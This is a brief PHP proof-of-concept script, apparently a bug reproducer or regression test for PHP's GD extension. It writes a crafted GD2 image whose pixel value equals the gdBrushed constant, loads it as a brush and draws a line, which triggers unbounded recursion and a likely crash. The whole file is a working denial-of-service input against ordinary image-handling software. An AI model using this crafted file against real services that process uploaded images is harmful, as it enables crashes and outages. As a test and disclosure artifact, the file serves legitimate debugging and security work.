<?php
// Truecolor GD2 pixel 0xFFFFFFFD is gdBrushed (-3). Loader writes it
// straight into tpixels. imagesetbrush + imageline then recurses
// gdImageBrushApply -> gdImageSetPixel forever.
$pix = pack('N', 0xFFFFFFFD);
$gd2 = "gd2\x00"
    . pack('n', 2) . pack('n', 1) . pack('n', 1) . pack('n', 64)
    . pack('n', 3) . pack('n', 1) . pack('n', 1)
    . pack('C', 1) . pack('N', 0xFFFFFFFF)
    . $pix;
$path = __DIR__ . '/brush.gd2';
file_put_contents($path, $gd2);
$im = imagecreatetruecolor(4, 4);
$br = imagecreatefromgd2($path);
if (!$br) { fwrite(STDERR, "gd2 load failed\n"); exit(2); }
echo "loaded " . imagesx($br) . "x" . imagesy($br) . "\n";
imagesetbrush($im, $br);
echo "draw\n";
imageline($im, 0, 0, 3, 3, IMG_COLOR_BRUSHED);
echo "NOCRASH\n";
